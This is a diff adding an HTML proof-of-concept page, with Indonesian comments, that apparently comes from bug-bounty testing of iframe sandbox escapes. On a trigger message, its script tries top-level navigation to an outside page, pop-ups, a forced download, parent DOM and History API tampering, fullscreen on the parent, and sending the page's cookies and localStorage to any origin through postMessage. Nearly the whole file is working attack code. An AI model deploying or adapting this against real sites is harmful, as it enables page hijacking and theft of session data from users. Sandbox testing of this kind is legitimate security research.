@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Child Iframe - Advanced Escape</title>
+    <style>
+        body { background: #222; color: #fff; font-family: monospace; padding: 20px; text-align: center; }
+        #status { font-weight: bold; margin-top: 20px; padding: 10px; border-radius: 6px; background: #333; color: #ff9800; }
+    </style>
+</head>
+<body>
+    <h2>Child Iframe (Sandboxed)</h2>
+    <p>Menunggu sinyal dari Parent...</p>
+    <div id="status">Menunggu TRIGGER_EXPLOIT...</div>
+
+    <script>
+        const statusEl = document.getElementById('status');
+
+        function logToParent(msg, color) {
+            statusEl.innerText = msg;
+            statusEl.style.color = color;
+            try {
+                window.parent.postMessage("[CHILD] " + msg, "*");
+            } catch(e) {}
+        }
+
+        window.addEventListener('message', function(event) {
+            if (event.data === 'TRIGGER_EXPLOIT') {
+                logToParent("Menerima sinyal! Memulai eksploitasi agresif...", "#ff9800");
+                jalankanEksploitasi();
+            }
+        });
+
+        function jalankanEksploitasi() {
+            // 1. Uji Top Navigation (Mengubah halaman utama)
+            try {
+                window.top.location.href = "https://artha231.github.io/bug-microsoft-new-test/";
+                logToParent("Top Navigation: Berhasil?", "#0f0");
+            } catch(e) {
+                logToParent("Top Navigation: Diblokir oleh Sandbox", "#f00");
+            }
+
+            // 2. Uji Pop-up (Membuka tab baru)
+            try {
+                const newWin = window.open("https://google.com", "_blank");
+                if (newWin) {
+                    logToParent("Pop-up: Berhasil dibuka!", "#0f0");
+                } else {
+                    logToParent("Pop-up: Diblokir (Null returned)", "#f00");
+                }
+            } catch(e) {
+                logToParent("Pop-up: Diblokir oleh Sandbox", "#f00");
+            }
+
+            // 3. Uji Auto Download (Blob)
+            try {
+                const blob = new Blob(["HACKED"], { type: "text/plain" });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "sandbox_escape_test.txt";
+                document.body.appendChild(a);
+                a.click();
+                logToParent("Download: Berhasil dipicu", "#0f0");
+            } catch(e) {
+                logToParent("Download: Diblokir oleh Sandbox", "#f00");
+            }
+
+            // 4. Uji Akses ke Parent DOM (Harusnya gagal karena Cross-Origin)
+            try {
+                window.parent.document.body.style.background = "red";
+                logToParent("Akses Parent DOM: Berhasil! (Bahaya)", "#0f0");
+            } catch(e) {
+                logToParent("Akses Parent DOM: Diblokir (Cross-Origin)", "#f00");
+            }
+
+            // 5. TRIK BARU: Memanipulasi URL Parent via History API
+            try {
+                window.parent.history.replaceState({}, '', '/hacked');
+                logToParent("History API Parent: Berhasil diubah!", "#0f0");
+            } catch(e) {
+                logToParent("History API Parent: Diblokir", "#f00");
+            }
+
+            // 6. TRIK BARU: Mencoba memicu Fullscreen pada Parent
+            try {
+                window.parent.document.documentElement.requestFullscreen();
+                logToParent("Fullscreen Parent: Berhasil dipicu!", "#0f0");
+            } catch(e) {
+                logToParent("Fullscreen Parent: Diblokir", "#f00");
+            }
+
+            // 7. TRIK BARU: Mengirim Data Sensitif via postMessage (Simulasi Pencurian)
+            try {
+                const stolenData = { cookie: document.cookie, localStorage: JSON.stringify(localStorage) };
+                window.parent.postMessage(stolenData, "*");
+                logToParent("Data Exfiltration: Berhasil dikirim!", "#0f0");
+            } catch(e) {
+                logToParent("Data Exfiltration: Gagal", "#f00");
+            }
+        }
+    </script>
+</body>
+</html>
